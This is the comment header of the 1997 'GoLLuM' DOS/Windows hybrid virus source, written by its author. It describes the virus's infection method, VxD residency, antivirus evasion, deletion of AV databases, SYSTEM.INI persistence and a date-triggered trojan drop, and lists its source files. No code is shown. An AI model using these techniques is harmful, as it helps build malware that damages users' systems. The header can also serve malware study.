   ;
   ;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;   ³   GoLLuM ViRuS - BioCoded by GriYo/29A     ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;   ³  CopyRight (c) 1997 All RiGhts ReseRVed     ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;   ³    World's first DOS/Win hybrid ever       ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ;  GoLLuM is the very first hybrid DOS-Windows virus ever... it infects DOS
   ;  EXE files only  when  they're executed  inside a DOS window under any of
   ;  the known versions of Microsoft Windows (Windows 3.1x, Windows95...). It
   ;  becomes resident  as a  virtual device driver  when  Windows starts, and
   ;  then hooks V86 int 21h in order to monitor file execution, trying to in-
   ;  fect more files under DOS sessions.
   ;
   ;  When an EXE file is executed inside a MS-DOS window, GoLLuM  will attach
   ;  itself to the end of the file (it copies first its DOS code and then the
   ;  VxD file, both of them encrypted with  a simple 'not' operation). GoLLuM
   ;  will not infect files that have digits or the 'V' character in their na-
   ;  mes (this includes AVP, MSAV, CPAV...), as well as Thunderbyte utilities
   ;  (TB*.*), McAffee shit and F-Prot.
   ;
   ;  The virus also deletes some AV database files (ANTI-VIR.DAT, CHKLIST.MS,
   ;  AVP.CRC, IVB.NTZ and CHKLIST.TAV) whenever it infects a file. When these
   ;  infected  files  are run, GoLLuM inserts  the string 'DEVICE=GOLLUM.386'
   ;  into the [386Enh] section of the SYSTEM.INI file, and then drops its VxD
   ;  file into the Windows \SYSTEM directory.
   ;
   ;  The encryption used by GoLLuM  consists on a simple 'not' operation, but
   ;  the decryptor contains  a little  emulation trick (try  to TbClean it!).
   ;  Besides, it contains a date-triggered event, in which it  will drop tro-
   ;  jan files (using the DOS stub in its VxD file).
   ;
   ;  I wrote this just for fun while learning something on VxD coding. GoLLuM
   ;  consists on the following files:
   ;
   ;  GOLLUM.ASM        DOS virus code
   ;  CRYPT.ASM         Code used to encrypt DOS virus code
   ;  WGOLLUM.MAK       VxD makefile
   ;  WGOLLUM.DEF       VxD def file
   ;  VXDSTUB.ASM       VxD stub used in trojans
   ;  WGOLLUM.ASM       VxD virus code
   ;  ASSEMBLE.BAT      Batch file used to build GOLLUM.INC
   ;
